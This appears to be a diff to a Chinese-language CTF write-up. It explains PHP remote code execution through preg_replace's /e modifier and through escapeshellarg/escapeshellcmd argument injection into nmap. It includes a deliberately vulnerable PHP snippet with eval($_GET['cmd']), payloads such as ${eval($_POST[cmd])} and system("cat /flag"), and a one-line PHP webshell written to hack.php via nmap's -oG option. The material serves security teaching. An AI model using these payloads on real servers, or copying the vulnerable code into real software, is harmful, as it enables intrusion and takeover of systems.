@@ -2685,7 +2685,137 @@ $file 最后是文件包含，也是要传文件名的
 
 ```php
 <?php
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ?> -oG hack.php '
+$id = $_GET['id'];
+$_SESSION['id'] = $id;
+
+function complex($re, $str) {
+    return preg_replace(
+        '/(' . $re . ')/ei',
+        'strtolower("\\1")',
+        $str
+    );
+}
+
+
+foreach($_GET as $re => $str) {
+    echo complex($re, $str). "\n";
+}
+
+function getFlag(){
+	@eval($_GET['cmd']);
+}
+```
+
+将所有 GET 参数的“键”当作 `$re` 正则模式，“值”当作 `$str` 待处理文本，逐一调用 `complex()`
+
+```php
+foreach($_GET as $re => $str) {
+    echo complex($re, $str). "\n";
+}
+```
+
+preg_replace 用于进行正则表达式替换的函数
+
+第一个参数是要匹配的正则表达式模式，第二个参数是用于替换的内容，第三个是要进行替换的输入字符串
+
+![](https://pic1.imgdb.cn/item/67b1728cd0e0a243d4ffc1f4.jpg)
+
+这段代码的作用是：在字符串 `$str` 中查找匹配正则表达式 `($re)` 的部分，将匹配到的内容转换为小写形式
+
+- **`/e` 修饰符**：表示将替换字符串作为 PHP 代码执行
+- **`/i` 修饰符**：表示正则匹配不区分大小写
+
+因此，`strtolower("\\1")` 会将第一个捕获组（即匹配的内容）转换为小写
+
+```php
+preg_replace(
+    '/(' . $re . ')/ei',
+    'strtolower("\\1")',
+    $str
+);
+
+# $re = 'HELLO'
+# $str = 'Hello World!'
+# 输出：hello World!
+```
+
+现在再来看源代码多了个 `ei`，`e` 修饰符会导致正则表达式的替换部分 `strtolower("\\1")` 被当作 PHP 代码执行
+
+`i` 修饰符不区分大小写，相当于 `eval('strtolower("\\1");')`
+
+当 \\1 是我们传进去的 `{${phpinfo()}}` 时，其实就是 `eval('strtolower("{${phpinfo()}}");')`
+
+但是我们为什么要传入 `{${phpinfo()}}` 呢？
+
+`${phpinfo()}` 中的 `phpinfo()` 会被当作变量先执行，执行后变成 `${1}`
+
+1 是因为 `phpinfo()` 成功执行后返回 true，而 `strtolower("{${1}}")` 又相当于空字符串
+
+所以关键在于 preg_match 的第二个参数是先被当作变量执行了，达到命令执行的效果
+
+![](https://pic1.imgdb.cn/item/67b17340d0e0a243d4ffc20a.jpg)
+
+上面的 **preg_replace** 语句如果直接写在程序里面，当然可以成功执行 `phpinfo()`
+
+通过 GET 传参构造 payload，在 = 号左边传的是匹配模式，右边是要调用的函数或命令
+
+然而传入 `.*` 却直接报错 
+
+![](https://pic1.imgdb.cn/item/67b1737ad0e0a243d4ffc20f.jpg)
+
+当非法字符为首字母时，只有点号会被替换成下划线报错，需要绕过这一步
+
+`\S` 匹配所有非空白符不包括换行，加个 `*` 匹配多个
+
+再跟上 `${eval($_POST[cmd])}`，再传参 `cmd=system("cat /flag");`
+
+![](https://pic1.imgdb.cn/item/67b173add0e0a243d4ffc219.jpg)
+
+成功拿到 flag
+
+![](https://pic1.imgdb.cn/item/67b173ccd0e0a243d4ffc21d.jpg)
+
+
+<!-- Imported from D:\\Book\\Web\\Chapter6\6-7.md -->
+### escapeshellarg/cmd RCE
+
+
+![](https://pic1.imgdb.cn/item/67b174add0e0a243d4ffc23a.jpg)
+
+打开网页拿到源码
+
+![](https://pic1.imgdb.cn/item/67b174bcd0e0a243d4ffc23c.jpg)
+
+传入的参数是：172.17.0.2' -v -d a=1
+
+经过 escapeshellarg 处理后变成了 '172.17.0.2 '\\'' -v -d a=1'
+
+即先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用
+
+经过 escapeshellcmd 处理后变成 '172.17.0.2 '\\\\'' -v -d a=1\\'
+
+这是因为 escapeshellcmd 对 \ 以及最后那个不配对儿的引号进行了转义
+
+最后执行的命令是 curl '172.17.0.2 '\\\\'' -v -d a=1\\'
+
+由于中间的 \\\ 被解释为 \ 而不再是转义字符，所以后面的 ' 没有被转义，与再后面的 ' 配对儿成了一个空白连接符
+
+即向 172.17.0.2 发起请求，POST 数据为 a=1
+
+所以经过我们构造之后，输入的值被分割成为了三部分
+
+第一部分就是curl的IP，为172.17.0.2\
+
+第二部分就是两个配对的单引号 ' '
+
+第三部分就是命令参数以及对象 -v -d a=1'
+
+nmap 有一个参数 -oG 可以实现将命令和结果写到文件
+
+所以我们可以控制自己的输入写入文件，这里我们可以写入一句话木马链接，也可以直接命令 cat flag
+
+```php
+?host=' <?php eval($_POST["hack"]);?> -oG hack.php '
 ```
 
 ![](https://pic1.imgdb.cn/item/67b1753fd0e0a243d4ffc24c.jpg)
